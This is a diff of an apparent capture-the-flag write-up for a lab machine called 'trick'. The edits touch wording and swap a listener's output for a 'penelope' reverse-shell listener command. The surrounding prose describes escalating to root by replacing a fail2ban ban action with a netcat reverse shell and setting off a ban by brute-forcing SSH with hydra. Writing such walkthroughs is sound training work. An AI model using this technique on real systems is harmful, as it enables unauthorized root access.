@@ -217,7 +217,7 @@ I found this entry:
 
 ![[Pasted image 20250908015221.png]]
 
-I found this site:
+The site it hosted was this:
 
 ![[Pasted image 20250908211556.png]]
 
@@ -290,19 +290,11 @@ actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
 
 We can just replace some of these actions with a `netcat` reverse shell (`nc` is installed on the target). Using `actionstart` and restarting the service didn't work. Using `actionban` worked: I triggered a ban by brute-forcing `SSH` with `hydra`.
 
->[!tip]
+>[!note]
 >Because of the file's permissions, I had to copy this file to `/tmp/`, edit it, and copy it back to `/etc/fail2ban/action.d/`.
 
 ```shell
-listen linux 1234
-
-[!] Fix command copied to clipboard:
-    export TERM=xterm-256color; stty rows 42 cols 191; alias ls='ls --color=auto'; alias grep='grep --color=auto'; alias ip='ip --color=auto'
-
-info: Listening on 0.0.0.0:1234
-                               info: Connection Received
-                                                        root@trick:/# 
-														
+penelope -p 1234
 root@trick:/# whoami
 root
 ```
